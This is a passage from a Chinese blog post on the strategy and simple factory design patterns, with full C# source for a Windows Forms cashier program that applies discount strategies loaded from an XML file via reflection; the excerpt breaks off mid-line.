title="策略模式与简单工厂模式的区别"></a>策略模式与简单工厂模式的区别</h1><p><strong>从组成对象来说</strong>：</p><ul><li><p>简单工厂模式：抽象商品角色、具体商品角色、简单工厂角色</p></li><li><p>策略模式：抽象策略角色、具体策略角色、上下文角色(环境角色)</p></li></ul><p><strong>从角色之间得关系来说</strong>：</p><ul><li>抽象策略角色与上下文角色的关系是<strong>聚合关系</strong></li><li>抽象商品角色与简单工厂角色之间是<strong>依赖关系</strong></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="策略与简单工厂集合完整源码"><a href="#策略与简单工厂集合完整源码" class="headerlink" title="策略与简单工厂集合完整源码"></a>策略与简单工厂集合完整源码</h2><p><strong>CashContext.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取工厂</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        CashSuper cs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据条件返回相应的对象</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span><span class="token keyword">string</span> type<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    CashNormal cs0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cs0<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    CashReturn cr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr1<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    CashRebate cr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr2<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashNormal.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//正常收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//打折收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化时，必需要输入折扣率,如八折，就是0.8</span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//返利收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化时必须要输入返利条件和返利值，比如满300返100，则moneyCondition为300，moneyReturn为100</span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span> <span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若大于返利条件，则需要减去返利值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result <span class="token operator">=</span> money <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashSuper.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取父类</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抽象方法：收取现金，参数为原价，返回为当前价</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Form1.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//策略对象的的创建在上下文类中完成，即策略对象的创建是对用户保密的</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//客户端窗体程序（主要部分）</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//利用简单工厂模式根据下拉选择框，生成相应的对象</span>            CashContext csuper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过多态，可以得到收取费用的结果</span>            totalPrices <span class="token operator">=</span> csuper<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//展示计价结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span>                <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashAcceptType.xml</strong>：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CashAcceptType</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>正常收费<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashNormal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满300返100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>300,100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满200返50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>200,50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打8折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打7折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CashAcceptType</span><span class="token punctuation">></span></span></code></pre><h2 id="策略-反射完整源码"><a href="#策略-反射完整源码" class="headerlink" title="策略+反射完整源码"></a>策略+反射完整源码</h2><p><strong>CashSuper.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashNormal.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span><span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result<span class="token operator">=</span>money<span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashContext.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置上下文中的策略实例对象</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBehavior</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Form1.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        DataSet ds<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于存放配置文件信息</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 在程序加载时，读取指定文件中的所有内容</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form1_Load</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//读配置文件                     --在程序运行的路径下</span>            ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">ReadXml</span><span class="token punctuation">(</span>Application<span class="token punctuation">.</span>StartupPath <span class="token operator">+</span> <span class="token string">"\\CashAcceptType.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将读取到的记录绑定到下拉列表框中</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>DataRowView dr <span class="token keyword">in</span> ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DefaultView<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cbxType<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cbxType<span class="token punctuation">.</span>SelectedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化一个上下文对象</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//根据用户的选项，查询用户选择项的相关行</span>            DataRow dr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DataRow<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Select</span><span class="token punctuation">(</span><span class="token string">"name='"</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//声明一个参数的对象数组</span>            <span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若有参数，则将其分割成字符串数组，用于实例化时所用的参数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>                args <span class="token operator">=</span> dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过反射实例化出相应的算法对象</span>            cc<span class="token punctuation">.</span><span class="token function">setBehavior</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CashSuper<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token 